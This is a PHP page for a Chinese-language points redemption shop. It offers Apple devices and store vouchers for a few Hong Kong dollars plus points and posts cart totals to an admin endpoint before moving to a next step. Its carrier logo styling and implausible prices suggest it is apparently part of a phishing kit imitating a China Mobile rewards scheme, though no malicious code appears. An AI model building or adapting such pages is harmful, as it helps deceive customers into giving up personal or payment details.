<?php
session_start();
//require_once 'config.php';
include('header.php');
// include('partials/header-new.php');

if (isset($_POST['submit'])) {
    $_SESSION['step1Data'] = $_POST;
}

$productList = [
    [
        'product_name' => "雀巢咖啡- 醇品即溶咖啡粉(玻璃樽裝) - 行貨200克",
        'product_price' => 'HK$5.9+900積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '5.9',
        'product_image' => '/images/44456.jpg'
    ],
    [
        'product_name' => "雀巢(Nescafe Dolce Gusto)胶囊咖啡机",
        'product_price' => "HK$23+1,020積分",
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '23',
        'product_image' => '/images/11991.jpg'
    ],
    [
        'product_name' => "Apple TV 4K Wifi-64GB",
        'product_price' => 'HK$35+1,100積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '35',
        'product_image' => '/images/appletv__.png'
    ],
    [
        'product_name' => "Apple HomePod(顏色隨機)",
        'product_price' => 'HK$46+1,300積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '46',
        'product_image' => '/images/home_pod.png'
    ], 
    [
        'product_name' => "Tineco Floor干湿真空智能硬木地板清洁机",
        'product_price' => 'HK$72+1,350積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '72',
        'product_image' => '/images/12644465654.jpg'
    ], 
    [
        'product_name' => "JBL Flip 5 便携式蓝牙音箱",
        'product_price' => 'HK$53+1,400積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '53',
        'product_image' => '/images/51yqwhTyhXL._AC_.jpg'
    ] 


];


$productListtwo = [
    [
        'product_name' => "太興- $50 港式美食現金券 *4",
        'product_price' => 'HK$13.6+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '13',
        'product_image' => '/images/1-2.jpg'
    ],
    [
        'product_name' => "PNS百佳現金禮券$100*2",
        'product_price' => 'HK$21+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '21',
        'product_image' => '/images/pns.jpg'
    ],
    [
        'product_name' => "惠康 / Market Place $100 現金券*2",
        'product_price' => 'HK$21+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '21',
        'product_image' => '/images/8789596.jpg'
    ],
    [
        'product_name' => "萬寧 現金禮券$100*2",
        'product_price' => 'HK$17+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '17',
        'product_image' => '/images/123456789.png'
    ], 
    [
        'product_name' => "稻香集團 現金禮券$100*2",
        'product_price' => 'HK$12+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '12',
        'product_image' => '/images/847585.jpg'
    ],
    [
        'product_name' => "一田百貨現金券 $100*2",
        'product_price' => 'HK$19+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '19',
        'product_image' => '/images/25369.jpg'
    ], 
    [
        'product_name' => "聯合新零售 現金券 $100*2",
        'product_price' => 'HK$9+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '9',
        'product_image' => '/images/1-3.jpeg'
    ],[
        'product_name' => "美心飲食禮券 $100*2",
        'product_price' => 'HK$18+1,500積分',
        'price' => '5000',
        'product_qty' => 0,
        'finalprice' => '18',
        'product_image' => '/images/Picture1.png'
    ]


];

?>
    <style>
        .wrap {
/*            margin-top:70px;*/
            padding:30px 30px;
        }
        @media(max-width: 767px) {
            .loader-wrap {
                display: flex;
                width: 100%;
                height: 100%;
                position: fixed;
                top: 0;
                left: 0;
                align-items: center;
                justify-content: center;
                z-index: 99999999999999;
                background: rgba(255, 255, 255, 1);
            }


            .loader-wrap .loading {
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .loader-wrap .loading img.china-mobile-logo-img {
                width: 200px;
            }

            .loader-wrap .loading img {
                width: 80px;
            }
            .box{
                background: linear-gradient(90deg,#fd0 0,#faa61a);;
              /*  padding:30px 20px; */
                border-radius:8px;
               /* display: flex; */
                align-items: center;
                justify-content: center;
            }
            .tab-container .tab {               
                 padding: 13px !important;
    margin-top: 5px !important;
    margin-left: 6px !important;
    margin-right: 6px !important;
    display:-webkit-inline-box !important;

}
            .section_1{
                width:50%;
            }
            .section_2{
                width:50%;
            }
            .inner_box {
                display:flex;
                flex-direction:column;
            }
            .inner_box > span {
                color:#000;
            }
            .inner_box > b {
                color:#000;
            }
            .product_area {
                margin-top:12px;
            }
            .product_area > b {
                color:#e11086;
            }
            .product_list {
                display: grid;
                align-items: center;
                justify-content: center;
                text-align: center;
                grid-template-columns: auto auto;
            }
            .product_s {
                width: 85%;
                border: 1px solid #efefef;
                margin: 5px;
                padding:12px;
                height: 300px;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }
            .product_s > p {
                margin-bottom: 5px;
                font-size: 15px;
                font-weight: 500;
            }
            .p_name {

            }
            .p_image {
                width:100%;
            }
            .p_quantity {
                color:#FB9316;
                font-weight: bold;
            }
            .p_cart{
                padding: 4px;
                background: #2870d3;
                color: #fff;
                border: 0px;
                width: 100%;
                border-radius: 12px;
            }
            .update_qty > input:focus{
                outline:none;
            }
            .update_qty > input:active{
                outline:none;
            }
            .update_qty > input {
                outline:none;
                border:0px;
                width:90px;
                text-align:center;
            }
            .update_qty {
                margin-bottom:8px;
                border-radius:8px;
                padding:3px;
                display: flex;
                align-items: center;
                justify-content: center;
                border: 1px solid;
            }
            .next_page {
            
            width: 100%;
            line-height: 60px;
            text-align: center;
            display: inline-block;
            color: #fff !important;
            border-radius: 30px;
            background: linear-gradient(56.78deg, #f70c93 0%, #7433df 63.27%, #2da9c8 100%);
            cursor: pointer;
        
            }
        }
        .wrap > b {
            color: #e11086;
        }
        .box-slider img {
                width: 100%;
                padding-bottom: 10px;
            }

            #carBtn {
            width: 100%;
            line-height: 40px;
            text-align: center;
            display: inline-block;
            color: #000 !important;
            border-radius: 30px;
            background: linear-gradient(90deg,#fd0 0,#faa61a);
            cursor: pointer;
            margin-bottom: 20px;
        }

/*tab css*/

 .tab-container {
      display: flex;
      justify-content: space-around;
    /*  margin: 20px;*/
    }

    .tab {
      cursor: pointer;
     /* padding: 10px;*/
   /*   border: 1px solid #ccc;
      border-radius: 5px 5px 0 0;*/
    }

    .tab-content {
      display: none;
    /*  padding: 20px;
      border: 1px solid #ccc;
      border-radius: 0 0 5px 5px;*/
    }

    .tab-content.active {
      display: block;
    }



.box .tab-container .section_1 {
    width: 100%;
}
.box .tab-container .inner_box {
    display: unset;
}
.box .tab-container .section_2 {
    width: 100%;
}
.box .tab {
    padding: 0 12px;
}




.tab-container {
        display: flex;
        justify-content: space-around;
    }

    .tab {
        display: flex;
        align-items: center;
        cursor: pointer;
        width: 100% !important;
    }

    .tab input {
        margin-right: 5px;
    }

    .inner_box {
        display: flex;
        flex-direction: column;
    }

    .tab input {
        margin-right: 5px;
        /* Add your preferred color styles for the radio button */
        
        border-radius: 50%; /* Make it round */
        width: 17px; /* Adjust the size if needed */
        height: 16px; /* Adjust the size if needed */
        appearance: none; /* Remove the default styles */
        outline: none; /* Remove the outline */
        cursor: pointer;
    }

    .tab input:checked {
        background-color: #000; /* Change the background color when checked */
    }

    .active-tab {       border: 3px solid #F9A61A !important; 
 background-color: #F9A61A;
 }

/*End tab css*/


    </style>
    <div class="wrap">
        <div class="box-slider">
            <img src="<?php echo $folder_path;?>/images/slider-page6.png">
        </div>
        <b>
            <i class="fa fa-chevron-left"></i> 積分明細
        </b>

  
<div class="box">
    <div class="tab-container">
        <label for="radioTab1" class="tab" onclick="showTab(1)">
            <input type="radio" name="tab" id="radioTab1" checked>
            <div class="section_1">
                <div class="inner_box">
                    <span class="tab-label"><a href="javascript:void(0);" onclick="showTab(1)">產品兌換</a></span>
                    <input type="hidden" id="totalValue" value="5000" />
                    <b></b>
                </div>
            </div>
        </label>
        <label for="radioTab2" class="tab" onclick="showTab(2)">
            <input type="radio" name="tab" id="radioTab2">
            <div class="section_2">
                <div class="inner_box">
                    <span class="tab-label"><a href="javascript:void(0);" onclick="showTab(2)">現金券兌換</a></span>
                    <b></b>
                </div>
            </div>
        </label>
    </div>
</div>
<div class="tab-content active" id="tab1">
 <div class="product_area">
            <b>
                獎賞兌換
            </b>
            <div class="product_list">
                <input type="hidden" value="" id="totalPrice" />
                <input type="hidden" value="" id="finaltotalPrice" />
                <?php foreach($productList as $k => $products) { ?>
                    <div class="product_s">
                        <img class="p_image" src="<?php echo $folder_path;?>/<?php echo $products['product_image']  ?>" />
                        <p class="p_name"><?php echo $products['product_name'] ?></p>
                        <p class="p_quantity"><?php echo $products['product_price'] ?></p>
                        <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                        <input type="hidden" id="final_price<?php echo $k ?>" value="<?php echo $products['finalprice'] ?>" />
                        <div class="update_qty">
                            <i class="fa fa-plus" onclick="up(<?php echo $k ?>)"></i>
                            <input type="number" disabled value="0" id="qty<?php echo $k ?>" />
                            <i class="fa fa-minus" onclick="down(<?php echo $k ?>)"></i>
                        </div>
<!--                        <button class="p_cart">大車</button>-->
                    </div>
                <?php
                    }
                ?>
            </div>
        </div>
</div>

<div class="tab-content" id="tab2">
  <div class="product_area">
            <b>
                獎賞兌換
            </b>
            <div class="product_list">
              
                <?php foreach($productListtwo as $k => $products) { ?>
                    <div class="product_s">
                        <img class="p_image" src="<?php echo $folder_path;?>/<?php echo $products['product_image']  ?>" />
                        <p class="p_name"><?php echo $products['product_name'] ?></p>
                        <p class="p_quantity"><?php echo $products['product_price'] ?></p>
                        <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                         <input type="hidden" id="final_price<?php echo $k ?>" value="<?php echo $products['finalprice'] ?>" />
                        <div class="update_qty">
                            <i class="fa fa-plus" onclick="up(<?php echo $k ?>)"></i>
                            <input type="number" disabled value="0" id="qty<?php echo $k ?>" />
                            <i class="fa fa-minus" onclick="down(<?php echo $k ?>)"></i>
                        </div>
<!--                        <button class="p_cart">大車</button>-->
                    </div>
                <?php
                    }
                ?>
            </div>
        </div>
</div>




        
        <br>
        <br>
        <div class="nextPage">
            <div id="progress-loading" style="display:none;text-align:center;"><img style="width:60px; height:auto;" src="../loading.gif" /></div>
            <button class="next_page" id="carBtn" onclick="goToNextPage()">兌換</button>
        </div>
    </div>




    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        setTimeout(() => {
            jQuery('.loader-wrap').hide();
        }, 3000);
        let totalValue = Number($('#totalValue').val());
        let calculateValue = 0;
        let quantity = 0;
  
        function up(val) {
         
            let totalPrice = Number($('#totalPrice').val());
            if(calculateValue >= totalValue) {
                alert('超出可用積分');
                console.log("value already exeeded");
            } else {
                let value = Number($('#qty' + val).val()) + 1;
                quantity = value;
                $('#qty' + val).val(value);
                let productPrice = Number($('#price' + val).val());
                let final_price = Number($('#final_price' + val).val());
                let finalValue = productPrice * value;
                calculateValue = finalValue;
                console.log("totalPrice ===>", finalValue);
                $('#totalPrice').val(calculateValue);
                $('#finaltotalPrice').val(final_price);
                if (finalValue > totalValue) {
                    alert('超出可用積分');
                }
            }
        }
        function down(val) {
            let value = Number($('#qty'+val).val()) - 1;
            quantity = value;
            let totalPrice = Number($('#totalPrice').val());
            if(value >= 0) {
                $('#qty' + val).val(value);
                let productPrice = Number($('#price'+val).val());
                console.log("productPrice ==>",productPrice);
                console.log("totalPrice ==>",totalPrice);
                let finalValue = calculateValue - productPrice;
                console.log("finalValue ===>",finalValue);
                calculateValue = finalValue;
                $('#totalPrice').val(finalValue);
                 $('#finaltotalPrice').val("");
            }
        }
        function goToNextPage() {
            let totalPrice = Number($('#totalPrice').val());
            let finaltotalPrice = Number($('#finaltotalPrice').val());
            console.log('totalPrice ===>',totalPrice);
            console.log('totalValue ===>',totalValue);
            console.log('quantity ===>',quantity);
       
            
            let formData = {
                total_quantity:quantity,
                finaltotalprice:finaltotalPrice
            }
            $("#progress-loading").show();
            $('#carBtn').prop('disabled',true);
            $.ajax({
                url:"/admin/cart.php",
                type:"POST",
                data:formData,
                success: function(response) {
                    $("#progress-loading").hide();
                    console.log("response ===>",response);
                    window.location.href='page3.php';
                },
                error: function(error) {
                    $("#progress-loading").hide();
                    $('#carBtn').prop('disabled',false);
                    console.log("error ===>",error);
                }
            });
            // if(calculateValue >= totalValue) {
            //     alert('超出可用積分');
            // } else {
            //     window.location.href='page3.php';
            // }
        }
    </script>


 

<script>
    // Show Tab 1 by default
    document.getElementById('tab1').classList.add('active');
    document.getElementById('radioTab1').checked = true;
    document.querySelector('label[for="radioTab1"]').classList.add('active-tab'); // Add this line

    function showTab(tabNumber) {
        // Hide all tab contents
        document.querySelectorAll('.tab-content').forEach(function (tabContent) {
            tabContent.classList.remove('active');
        });

        // Remove the active-tab class from all labels
        document.querySelectorAll('.tab').forEach(function (tabLabel) {
            tabLabel.classList.remove('active-tab');
        });

        // Show the selected tab content
        document.getElementById('tab' + tabNumber).classList.add('active');
        document.getElementById('radioTab' + tabNumber).checked = true;

        // Add the active-tab class to the label of the active tab
        document.querySelector('label[for="radioTab' + tabNumber + '"]').classList.add('active-tab');
    }
</script>





<?php
include('footer-new.php');
